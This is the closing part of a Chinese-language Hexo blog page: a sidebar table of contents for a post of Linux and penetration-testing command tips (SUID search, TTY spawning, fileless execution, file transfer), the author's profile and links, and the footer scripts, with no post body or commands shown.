+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#查看用户-用户组"><span class="nav-number">1.</span> <span class="nav-text">查看用户|用户组</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#显示某个文件的第几行"><span class="nav-number">2.</span> <span class="nav-text">显示某个文件的第几行</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#删除文本换行符和空格"><span class="nav-number">3.</span> <span class="nav-text">删除文本换行符和空格</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#linux-下删除文本空行"><span class="nav-number">4.</span> <span class="nav-text">linux 下删除文本空行</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#linux-shell-字符串反转-rev"><span class="nav-number">5.</span> <span class="nav-text">linux shell 字符串反转 rev</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#linux-shell-base64"><span class="nav-number">6.</span> <span class="nav-text">linux shell base64</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#查找SUID位的文件"><span class="nav-number">7.</span> <span class="nav-text">查找SUID位的文件</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#查看Linux内核-系统版本"><span class="nav-number">8.</span> <span class="nav-text">查看Linux内核&#x2F;系统版本</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#curl-部分用法"><span class="nav-number">9.</span> <span class="nav-text">curl 部分用法</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#wget部分用法"><span class="nav-number">10.</span> <span class="nav-text">wget部分用法</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#python打开tty"><span class="nav-number">11.</span> <span class="nav-text">python打开tty</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#没有python怎么打开tty"><span class="nav-number">12.</span> <span class="nav-text">没有python怎么打开tty?</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#python部署简易网站"><span class="nav-number">13.</span> <span class="nav-text">python部署简易网站</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#curl-wget-不验证证书进行https请求"><span class="nav-number">14.</span> <span class="nav-text">curl wget 不验证证书进行https请求</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#设置term"><span class="nav-number">15.</span> <span class="nav-text">设置term</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Arch-查询滚了多少次-…"><span class="nav-number">16.</span> <span class="nav-text">Arch 查询滚了多少次(…)</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#渗透过程中不记录历史命令"><span class="nav-number">17.</span> <span class="nav-text">渗透过程中不记录历史命令</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#无文件落地执行"><span class="nav-number">18.</span> <span class="nav-text">无文件落地执行</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Dos格式文件快速转为Unix"><span class="nav-number">19.</span> <span class="nav-text">Dos格式文件快速转为Unix</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Linux使用impakcet快速开启一个SMB共享目录"><span class="nav-number">20.</span> <span class="nav-text">Linux使用impakcet快速开启一个SMB共享目录</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#PIP下载文件"><span class="nav-number">21.</span> <span class="nav-text">PIP下载文件</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#whois传输文件"><span class="nav-number">22.</span> <span class="nav-text">whois传输文件</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#切换java版本"><span class="nav-number">23.</span> <span class="nav-text">切换java版本</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#编译32位且动态链接库文件很老的二进制文件"><span class="nav-number">24.</span> <span class="nav-text">编译32位且动态链接库文件很老的二进制文件</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#nohup"><span class="nav-number">25.</span> <span class="nav-text">nohup</span></a></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="atsud0"
+      src="https://images.atsud0.me/images/atsud0-avator.jpg">
+  <p class="site-author-name" itemprop="name">atsud0</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">128</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">10</span>
+        <span class="site-state-item-name">categories</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/index.html">
+          
+        <span class="site-state-item-count">166</span>
+        <span class="site-state-item-name">tags</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="https://github.com/atsud0" title="GitHub → https://github.com/atsud0" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="mailto:admin@atsud0.me" title="E-Mail → mailto:admin@atsud0.me"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="https://twitter.com/atsud0" title="Twitter → https://twitter.com/atsud0" rel="noopener" target="_blank"><i class="fab fa-twitter fa-fw"></i>Twitter</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="https://t.me/MindworkshopBot" title="Telegram → https://t.me/MindworkshopBot" rel="noopener" target="_blank"><i class="fab fa-telegram fa-fw"></i>Telegram</a>
+      </span>
+  </div>
+
+
+  <div class="links-of-blogroll motion-element">
+    <div class="links-of-blogroll-title"><i class="fa fa-link fa-fw"></i>
+      Links
+    </div>
+    <ul class="links-of-blogroll-list">
+        <li class="links-of-blogroll-item">
+          <a href="https://blog.ajin.cloud/" title="https://blog.ajin.cloud/" rel="noopener" target="_blank">ajin</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://leiblog.wang/" title="https://leiblog.wang/" rel="noopener" target="_blank">LeiWang</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://esonhugh.github.io/" title="https://esonhugh.github.io/" rel="noopener" target="_blank">Esonhugh</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://isabellainori.github.io/" title="https://isabellainori.github.io/" rel="noopener" target="_blank">Isabella Ross</a>
+        </li>
+    </ul>
+  </div>
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 2020 – 
+  <span itemprop="copyrightYear">2021</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">atsud0</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-chart-area"></i>
+    </span>
+      <span class="post-meta-item-text">Symbols count total: </span>
+    <span title="Symbols count total">407k</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-coffee"></i>
+    </span>
+      <span class="post-meta-item-text">Reading time total &asymp;</span>
+    <span title="Reading time total">6:10</span>
+</div>
+  <div class="powered-by">Powered by <a href="https://hexo.io" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://pisces.theme-next.org" class="theme-link" rel="noopener" target="_blank">NexT.Pisces</a>
+  </div>
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="Total Visitors">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="Total Views">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+  
+<script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
